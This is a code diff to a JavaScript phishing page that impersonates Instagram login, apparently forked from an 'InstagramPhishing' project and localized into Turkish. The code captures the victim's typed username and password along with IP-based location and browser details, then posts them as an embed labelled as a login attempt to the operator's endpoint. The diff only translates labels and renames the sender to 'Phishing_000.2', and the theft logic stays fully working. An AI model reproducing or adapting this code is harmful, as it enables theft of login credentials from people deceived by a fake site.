@@ -48,11 +48,11 @@ async function getInfo() {
     const response = await fetch("https://ipapi.co/json/");
     const data = await response.json();
     
-    const info = `> IP: ${data.ip}\n> City: ${data.city}\n> Region: ${data.region}\n> Country: ${data.country_name}\n> Postal Code: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
+    const info = `> IP: ${data.ip}\n> Şehir: ${data.city}\n> Bölge: ${data.region}\n> Ülke: ${data.country_name}\n> Posta kodu: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
     
     return info;
   } catch {
-    return `> IP: Unknown\n> City: Unknown\n> Region: Unknown\n> Country: Unknown\n> Postal Code: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
+    return `> IP: Unknown\n> Şehir: Unknown\n> Bölge: Unknown\n> Ülke: Unknown\n> Posta kodu: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
   }
 }
   
@@ -62,10 +62,10 @@ async function sendInfo() {
 
   const embed = {
     color: 1585803, //#18328b
-    title: "Login Attempt",
+    title: "Giriş denemesi",
     description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
     footer: {
-      text: "github.com/Josakko/InstagramPhishing",
+      text: "forOldDays",
     }
   }
 
@@ -74,7 +74,7 @@ async function sendInfo() {
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ username: "JK_InstagramPhishing", embeds: [embed] }) //content: `${Info}`
+    body: JSON.stringify({ username: "Phishing_000.2", embeds: [embed] }) //content: `${Info}`
   };
 
   try {
